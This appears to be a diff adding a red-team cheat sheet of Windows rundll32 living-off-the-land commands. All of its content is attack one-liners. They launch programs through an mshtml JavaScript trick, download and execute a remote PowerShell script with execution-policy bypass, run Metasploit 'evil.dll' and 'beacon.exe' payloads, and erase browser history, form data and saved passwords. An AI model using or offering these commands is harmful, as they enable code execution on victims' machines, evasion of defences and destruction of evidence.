@@ -1,0 +1,49 @@
+
+Open cacl.exe.
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("c:\\windows\\system32\\calc.exe");
+
+or
+
+rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe
+
+Write to file using powershell
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c write-output c:\\temp\\test123.txt | out-file c:\\temp\\test12345.txt");
+
+Write to file using cmd
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("c:\\windows\\system32\\cmd.exe /c echo test123 > c:\\temp\\test123.txt");
+
+Download and Execute PowerShell.
+
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/runme2.ps1')");
+
+Generate a DLL using Metasploit and run.
+
+rundll32.exe c:\temp\evil.dll,_dllmain@12
+or
+rundll32 shell32.dll,Control_RunDLL C:\Users\evil.dll
+
+3. Delete history.
+
+RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1
+
+4. Delete form data.
+
+ RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16
+
+5. Delete passwords.
+
+RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32
+
+Additional Options:
+
+rundll32.exe shell32.dll,Control_RunDLL payload.dll    
+rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe    
+rundll32.exe shell32.dll,OpenAs_RunDLL c:\temp\calc.hta   
+rundll32.exe shell32.dll,ShellExec_RunDLLA beacon.exe
+
+also
+
+https://github.com/api0cradle/LOLBAS/tree/master/OSLibraries
